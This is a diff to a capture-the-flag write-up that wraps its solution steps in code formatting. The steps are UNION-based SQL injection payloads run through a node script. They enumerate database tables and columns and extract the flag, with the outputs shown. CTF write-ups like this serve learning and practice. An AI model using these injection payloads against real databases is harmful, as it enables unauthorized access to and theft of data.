@@ -17,11 +17,19 @@ After that it is just simple sql injection.
 
 I also created a nodejs file to make it easier.
 
+<pre>
+<code>
 node test.js "100 union select 1,CONCAT(table_name,0x20) FROM information_schema.tables -- "
 gave us table name: fl4g
+</code>
+</pre>
 
+<pre><code>
 node test.js "100 union select 1,CONCAT(column_name,0x20) FROM information_schema.columns WHERE table_name = 'fl4g' -- "
 gave us column name: hey
+<code></pre>
 
+<pre><code>
 node test.js "100 union select 1,hey from fl4g -- "
 gave us flag: flag{emScripten_is_Cut3_right?}
+<code></pre>
